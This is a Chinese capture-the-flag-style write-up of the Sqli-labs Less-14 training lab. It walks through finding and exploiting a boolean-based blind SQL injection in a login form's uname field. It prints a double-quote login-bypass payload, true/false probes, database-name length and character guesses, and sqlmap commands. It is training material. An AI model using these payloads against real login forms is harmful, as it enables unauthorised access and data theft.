---
title: Sqli-labs Less-14 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入, 布尔盲注]
---
## 一、 漏洞概述
- **关卡**：Less-14
- **漏洞类型**：基于布尔逻辑的 POST 型盲注（Boolean-Based Blind POST SQL Injection）
- **注入点**：登录表单的 `uname` 参数
- **闭合方式**：双引号 `"`

## 二、 渗透测试过程

### 1. 探测注入点与闭合方式
访问 Less-14 关卡，页面为一个登录表单。使用 Burp Suite 开启代理拦截 POST 请求。
尝试输入 `admin'` 和 `admin')`，页面均未报错且提示登录失败，说明后端关闭了报错显示。

测试闭合符号，尝试使用双引号：
```text
uname=admin" #&passwd=123&submit=Submit
```

结果：页面提示登录成功。这证明后端 SQL 语句的包裹形式为 "$uname"，且注释符 # 成功截断了后续的密码验证逻辑。

### 2. 确认布尔盲注特征

由于页面不抛出任何 SQL 报错，且无法通过 UNION SELECT 回显数据，只能依靠页面的状态差异进行判断。Less-14 在登录成功时，会返回用户凭证信息；登录失败时仅提示失败。

利用逻辑运算测试状态差异：

· 条件为真：
  ```text
  uname=admin" and 1=1 #&passwd=123&submit=Submit
  ```
  （页面显示登录成功）
· 条件为假：
  ```text
  uname=admin" and 1=2 #&passwd=123&submit=Submit
  ```
  （页面显示登录失败）

由此确认存在基于布尔的盲注漏洞。

### 3. 手工盲注猜解数据

构造条件语句，通过页面是否返回登录成功状态来逐字猜解数据：

· 判断数据库名长度：
  ```text
  uname=admin" and length(database())=8 #&passwd=123&submit=Submit
  ```
  （返回成功，说明当前数据库名长度为 8）
· 猜解数据库名首字母（ASCII码）：
  ```text
  uname=admin" and ascii(substr(database(),1,1))>100 #&passwd=123&submit=Submit
  ```
  （通过不断调整数值，根据页面真假状态，可还原出数据库名 security）

注：手工盲注效率极低，实战中一般直接交由 SQLMap 自动化处理。

## 三、 自动化利用 (SQLMap)

由于是 POST 型盲注，使用 SQLMap 时需将 Burp Suite 拦截到的请求保存为文件（例如 less14.txt），然后使用 -r 参数进行测试。

```bash
# 跑出当前数据库名（SQLMap 会自动识别双引号闭合与布尔盲注技术）
sqlmap -r less14.txt --batch --current-db

# 也可以显式指定使用布尔盲注技术（B），以提升测试效率
sqlmap -r less14.txt --technique B --batch --current-db
```

## 四、 通关 Payload 汇总

测试目的 Payload (仅限 uname 字段) 页面状态
测试闭合与绕过 admin" # 登录成功
条件为真 admin" and 1=1 # 登录成功
条件为假 admin" and 1=2 # 登录失败
盲注测长度 admin" and length(database())=8 # 登录成功
